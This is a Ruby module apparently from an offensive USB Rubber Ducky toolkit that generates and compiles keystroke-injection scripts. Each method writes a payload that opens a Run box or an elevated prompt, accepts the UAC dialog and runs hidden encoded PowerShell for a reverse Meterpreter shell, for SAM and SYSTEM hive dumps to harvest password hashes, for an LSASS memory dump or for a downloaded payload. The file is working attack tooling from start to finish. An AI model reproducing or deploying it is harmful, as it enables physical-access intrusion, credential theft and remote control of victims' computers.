#!/usr/bin/env ruby
require './lib/core'
include MainCommands
module DuckySetUp
  @@file_path = 'text_files/'
  @@reverse_meterpreter_file = 'powershell_reverse_ducky.txt'
  @@hash_dump_file = 'hashdump_tcp.txt'
  @@lsass_dump_file = 'lsassdump_tcp.txt'
  @@wget_file = 'wget_powershell.txt'
  def meterpreter_low(encoded_command)
    File.open("#{@@file_path}#{@@reverse_meterpreter_file}",'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
  end
  def meterpreter_uac(encoded_command)
    File.open("#{@@file_path}#{@@reverse_meterpreter_file}",'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
  end
  def meterpreter_no_uac(encoded_command)
    File.open("#{@@file_path}#{@@reverse_meterpreter_file}",'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
  end
  @@save_sam = 'reg.exe save HKLM\SAM c:\windows\temp\sam'
  @@save_sys = 'reg.exe save HKLM\SYSTEM c:\windows\temp\sys'
  def hash_dump_uac(encoded_command)
    File.open("#{@@file_path}#{@@hash_dump_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING #{@@save_sam}\nENTER\nSTRING #{@@save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
  end
  def hash_dump_no_uac(encoded_command)
    File.open("#{@@file_path}#{@@hash_dump_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING #{@save_sam}\nENTER\nSTRING #{@save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
  end
  def lsass_uac(encoded_command1,encoded_command2)
    File.open("#{@@file_path}#{@@lsass_dump_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
  end
  def lsass_no_uac(encoded_command1,encoded_command2)
    File.open("#{@@file_path}#{@@lsass_dump_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
  end
  def wget_uac(encoded_command)
    File.open("#{@@file_path}#{@@wget_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")} 
  end
  def wget_no_uac(encoded_command)
    File.open("#{@@file_path}#{@@wget_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")} 
  end
  def wget_low(encoded_command)
    File.open("#{@@file_path}#{@@wget_file}","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")} 
  end
  def compile_ducky(file_name)
    print_info("Creating Bin File!\n")
    system("java -jar duck_encoder/encoder.jar -i #{@@file_path}#{file_name} -o inject.bin")
    print_success("Bin File Created!\n")
  end
end
